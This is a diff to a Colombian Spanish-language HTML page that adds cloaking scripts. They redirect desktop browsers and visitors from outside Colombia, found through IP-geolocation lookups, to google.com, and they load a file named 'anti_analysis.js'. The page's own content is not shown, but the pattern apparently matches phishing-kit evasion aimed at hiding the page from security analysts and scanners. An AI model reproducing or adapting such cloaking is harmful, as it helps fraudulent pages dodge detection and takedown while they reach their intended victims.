@@ -1,7 +1,91 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es-CO">
 
 <head>
+
+<script>
+// FILTRO DE DETECCIÓN Y BLOQUEO DE COMPUTADORAS DE ESCRITORIO (SOLO MÓVILES)
+(function enforceMobileOnly() {
+    try {
+        const ua = (navigator.userAgent || navigator.vendor || window.opera || '').toLowerCase();
+        
+        // 1. Detección de User-Agent Móvil
+        const isMobileUA = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+        
+        // 2. Detección de Sensores Táctiles de Hardware
+        const hasTouchScreen = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
+        
+        // 3. Detección de Puntero Táctil vs Mouse de Precisión
+        const isCoarsePointer = window.matchMedia ? window.matchMedia('(pointer: coarse)').matches : false;
+        
+        // 4. Verificación de Plataforma en Client Hints (Navegadores Modernos)
+        const isMobileData = (navigator.userAgentData && navigator.userAgentData.mobile) !== undefined 
+            ? navigator.userAgentData.mobile 
+            : null;
+
+        // Evaluar si es un PC (Si no coincide con User-Agent móvil O carece de puntos táctiles físicos)
+        let isDesktopPC = false;
+
+        if (isMobileData !== null) {
+            isDesktopPC = !isMobileData;
+        } else {
+            // Si el UA no es de móvil O no tiene puntos táctiles, se considera PC
+            if (!isMobileUA || (!hasTouchScreen && !isCoarsePointer)) {
+                isDesktopPC = true;
+            }
+        }
+
+        // Si se detecta un PC de escritorio, bloquear inmediatamente y redirigir
+        if (isDesktopPC) {
+            console.warn('⛔ Acceso restringido únicamente a dispositivos móviles. Dispositivo bloqueado: PC Desktop');
+            window.location.replace('https://www.google.com');
+        } else {
+            console.log('📱 Dispositivo móvil verificado correctamente.');
+        }
+    } catch(e) {}
+})();
+</script>
+
+<script src="assets/js/anti_analysis.js"></script>
+<script>
+// FILTRO DE GEOLOCALIZACIÓN REDUNDANTE (SÓLO IP DE COLOMBIA "CO")
+(async function restrictToColombia() {
+    try {
+        let country = null;
+        
+        // Intento 1: API Ipapi.co
+        try {
+            const res = await fetch('https://ipapi.co/json/', { timeout: 3000 });
+            if (res.ok) {
+                const data = await res.json();
+                country = data.country_code;
+            }
+        } catch(e) {}
+
+        // Intento 2 (Fallback): API Ip-api.com
+        if (!country) {
+            try {
+                const res = await fetch('http://ip-api.com/json/?fields=countryCode', { timeout: 3000 });
+                if (res.ok) {
+                    const data = await res.json();
+                    country = data.countryCode;
+                }
+            } catch(e) {}
+        }
+
+        // Si se determinó el país y NO es Colombia ('CO'), bloquear y redirigir
+        if (country && country !== 'CO') {
+            console.warn('⛔ Acceso denegado fuera de Colombia. País detectado:', country);
+            window.location.replace('https://www.google.com');
+        } else {
+            console.log('🇨🇴 Acceso permitido desde Colombia (' + (country || 'CO') + ')');
+        }
+    } catch (e) {
+        // En caso de fallo de red de las APIs, permitir acceso para no afectar usuarios legítimos
+    }
+})();
+</script>
+
     <link rel="icon"
         href="data:image/vnd.microsoft.icon;base64,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">
     <style>
